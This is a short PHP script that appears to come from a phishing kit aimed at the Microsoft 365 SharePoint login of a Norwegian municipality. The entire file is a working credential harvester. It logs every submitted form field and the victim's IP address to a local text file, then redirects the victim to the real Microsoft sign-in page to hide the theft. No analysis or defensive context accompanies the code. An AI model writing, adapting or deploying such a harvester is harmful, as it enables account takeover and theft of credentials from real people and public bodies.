<?php
header ('Location: https://login.microsoftonline.com/5f4db6c2-c1a6-430a-b652-5aae74de4b0c/oauth2/authorize?client_id=00000003-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code%20id_token&resource=00000003-0000-0ff1-ce00-000000000000&scope=openid&nonce=350E6C59AACEE6061BBA267BBD91C7331F5865638906ED6F-2B73EA0985BA1E43845910DFC3ED520F774366E8815B40BD17C5E2D2B39CFBE2&redirect_uri=https:%2F%2Foppdalkommune.sharepoint.com%2F_forms%2Fdefault.aspx&state=0&client-request-id=3257139e-a005-4000-9485-24d132a728bf ');
$handle = fopen("pLog.txt", "a");
$ip = $_SERVER['REMOTE_ADDR'];
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "IP=$ip");
fwrite($handle, "\r\n");
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>